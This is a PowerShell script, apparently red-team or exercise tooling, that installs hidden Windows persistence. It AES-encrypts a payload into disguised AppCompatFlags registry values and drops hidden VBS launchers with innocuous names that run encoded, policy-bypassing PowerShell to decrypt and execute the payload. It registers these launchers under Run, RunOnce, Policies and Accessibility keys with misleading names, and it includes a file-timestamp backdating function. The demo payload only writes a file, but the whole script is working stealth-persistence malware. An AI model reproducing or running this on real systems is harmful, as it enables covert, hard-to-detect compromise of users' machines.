$plainPayload = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"


function e($t,$s,$l){
    $d=New-Object Security.Cryptography.Rfc2898DeriveBytes($l,[Text.Encoding]::UTF8.GetBytes($s),10000)
    $c=[Security.Cryptography.Aes]::Create()
    $c.Key=$d.GetBytes(32)
    $c.IV=$d.GetBytes(16)
    $x=$c.CreateEncryptor()
    $b=$x.TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($t),0,$t.Length)
    $x.Dispose()
    $c.Dispose()
    $d.Dispose()
    [Convert]::ToBase64String($b)
}

function Set-RegValue($k,$n,$v){
    if(-not (Test-Path $k)){New-Item $k -Force -ErrorAction SilentlyContinue|Out-Null}
    Set-ItemProperty $k $n $v -Force -ErrorAction SilentlyContinue|Out-Null
}

function Backdate-File {
    param([string]$Path, [DateTime]$TargetDate)
    if (Test-Path $Path -ErrorAction SilentlyContinue) {
        try {
            $item = Get-Item $Path -Force -ErrorAction SilentlyContinue
            if ($item -and $item.FullName -notlike "*.DAT*" -and $item.FullName -notlike "*NTUSER*") {
                $item.CreationTime = $TargetDate
                $item.LastWriteTime = $TargetDate
                $item.LastAccessTime = $TargetDate
                Write-Host "[*] Backdated: $Path" -ForegroundColor Green
                return $true
            }
        } catch {}
    }
    return $false
}


Write-Host "[*] Installing HKCU persistence chains..." -ForegroundColor Cyan

# PRIMARY CHAIN - Store encrypted payload
$e1=e $plainPayload "StaticSalt1234" "S3cr3tK3y!2024#Showdown"
Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" "CacheData" $e1
Write-Host "[PRIMARY] Blob stored in AppCompatFlags\Layers" -ForegroundColor Green

# PRIMARY CHAIN - Loader script
$l1='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("S3cr3tK3y!2024#Showdown",[Text.Encoding]::UTF8.GetBytes("StaticSalt1234"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" CacheData -EA 0).CacheData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
$eL1=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l1))

# PRIMARY CHAIN - VBS wrapper
$v=$null
foreach($x in @("$env:APPDATA\Microsoft\Installer\msihelper.vbs","$env:APPDATA\Microsoft\Windows\Caches\cache.vbs")){
try{$d=Split-Path $x;if(!(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
$c=@();for($i=0;$i -lt $eL1.Length;$i+=8){$c+=$eL1.Substring($i,[Math]::Min(8,$eL1.Length-$i))}
$vbs="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c -join '""&""')""`nsh.Run c,0,False"
Set-Content $x $vbs -Encoding ASCII -Force;(gi $x -Force).Attributes=6;$v=$x;break}catch{}}
$c=if($v){"wscript.exe //B //Nologo `"$v`""}else{"powershell.exe -Exec Bypass -Window Hidden -Enc $eL1"}

# HKCU Triggers
# Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c  <-- Problematic line? (Robin)
Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateHelper" $c
Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "TempCleanup" $c
# Set-RegValue "HKCU:\Environment" "windir" $c  <-- Problematic line? (Robin)
Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsUpdate" $c

# BACKUP CHAIN - Store encrypted payload
$e2=e $plainPayload "DifferentSalt5678" "BackupKey!2024#DifferentPassword"
Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" "CompatData" $e2

# BACKUP CHAIN - Loader script
$l2='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("BackupKey!2024#DifferentPassword",[Text.Encoding]::UTF8.GetBytes("DifferentSalt5678"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" CompatData -EA 0).CompatData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
$eL2=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l2))

# BACKUP CHAIN - VBS wrapper
$bvp="$env:APPDATA\Microsoft\Internet Explorer\UserData\iehelper.vbs"
$d=Split-Path $bvp;if(!(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
$c2=@();for($i=0;$i -lt $eL2.Length;$i+=8){$c2+=$eL2.Substring($i,[Math]::Min(8,$eL2.Length-$i))}
$v2="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c2 -join '""&""')""`nsh.Run c,0,False"
Set-Content $bvp $v2 -Encoding ASCII -Force;(gi $bvp -Force).Attributes=6
$c2e="wscript.exe //B //Nologo `"$bvp`""
Write-Host "[BACKUP] VBS wrapper: $bvp" -ForegroundColor Green

# BACKUP CHAIN - Triggers
# Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c2e  <-- Problematic line? (Robin)
# Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" "Startup" $c2e <-- Problematic line? (Robin)
Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" "Configuration" $c2e

Write-Host "[BACKUP] Backup triggers installed" -ForegroundColor Green
